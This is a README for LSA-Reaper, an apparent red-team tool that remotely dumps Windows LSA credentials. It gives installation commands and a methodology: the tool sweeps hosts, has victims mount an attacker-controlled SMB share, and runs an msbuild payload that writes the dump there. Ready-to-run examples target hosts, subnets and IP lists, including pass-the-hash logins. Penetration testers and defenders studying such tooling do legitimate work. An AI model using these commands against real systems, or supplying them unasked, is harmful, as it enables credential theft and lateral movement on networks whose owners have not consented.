# LSA-Reaper
<p align="center">
  <img width="400" height="400" src="/assets/lsareaper.png">
</p>

LSA-Reaper is a remote command line LSA dumping tool that uses [Impacket's](https://github.com/SecureAuthCorp/impacket) wmiexec or atexec.

## Requirements
```
Linux
Impacket
pip pypykatz
pip netifaces
pip python-nmap
pip Pebble
Samba
```

## Installation
```
git clone https://github.com/samiam1086/LSA-Reaper.git
cd LSA-Reaper
sudo python3 -m pip install -r requirements.txt
cd ..
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
sudo python3 setup.py install
```
or
```
git clone https://github.com/samiam1086/LSA-Reaper.git
cd LSA-Reaper
sudo sh setup.sh
```

## Methodology
LSA-Reaper will begin by ping sweeping all provided IPs or IP ranges for alive hosts. LSA-Reaper will then create a SMB share with a random username and password that will act as the exfiltration point. LSA-Reaper will then execute the net use command on the victim machine via wmiexec or atexec to make the victim machine mount the share as a network drive and then execute msbuild to execute the payload which will dump LSA and save it to the mounted SMB share.

## Usage
```
sudo python3 lsa-reaper.py
```
![](/assets/hlp.png)

## Arguments
target - Target is a position argument formatted as domain/username:'Password'@IP for a domain account or username:'Password'@IP for a local machine account for both :'Password' is not required and if left empty will prompt for the account's password. Target is not required if -oe is present.

-share - Share is an optional argument for the wmiexec method to determine which share on the remote machine the output of wmiexec should be stored on and retrieved from.

-ts - ts or timestamp will add a timestamp to any output.

-debug - Debug is a positional argument that will turn debug output (more verbose) on.

## Examples
```
sudo python3 lsa-reaper.py domain/user:'Password'@ip

sudo python3 lsa-reaper.py testdomain/testuser:'P@ssw0rd!'@10.0.0.100

sudo python3 lsa-reaper.py testdomain/testuser:'P@ssw0rd!'@10.0.0.0/24

sudo python3 lsa-reaper.py testdomain/testuser:'P@ssw0rd!'@10.0.0.10-200

sudo python3 lsa-reaper.py testdomain/testuser:'P@ssw0rd!'@ipList.txt

sudo python3 lsa-reaper.py testdomain/testuser@10.0.0.100

sudo python3 lsa-reaper.py -hashes 'LMHASH:NTHASH' testdomain/testuser@10.0.0.100

sudo python3 lsa-reaper.py -ip local_ip testdomain/testuser@10.0.0.100

sudo python3 lsa-reaper.py -drive A testdomain/testuser@10.0.0.100

sudo python3 lsa-reaper.py -localauth localuser@10.0.0.100
```

![](/assets/Reaper-Running.png)

![](/assets/example.png)
